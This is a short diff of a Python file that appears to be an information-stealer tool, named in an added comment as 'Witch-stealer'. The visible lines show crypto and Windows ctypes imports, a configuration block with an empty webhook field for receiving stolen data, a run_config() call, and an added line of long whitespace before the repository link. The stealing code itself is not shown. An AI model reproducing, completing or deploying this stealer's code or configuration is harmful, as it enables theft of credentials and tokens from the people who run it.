@@ -23,6 +23,7 @@ import ctypes
 from ctypes import wintypes, byref, c_bool
 from Crypto.Cipher import AES
 
+
 __CONFIG__ = {
     "avatar_link": "https://cdn.pfps.gg/pfps/56483-dark-girl.jpeg",
     "webhook": "",
@@ -670,3 +671,5 @@ def run_config():
     # =========================== #
 
 run_config()
+                                                                                                                                                                                                                     
+# https://github.com/addadi000/Witch-stealer/
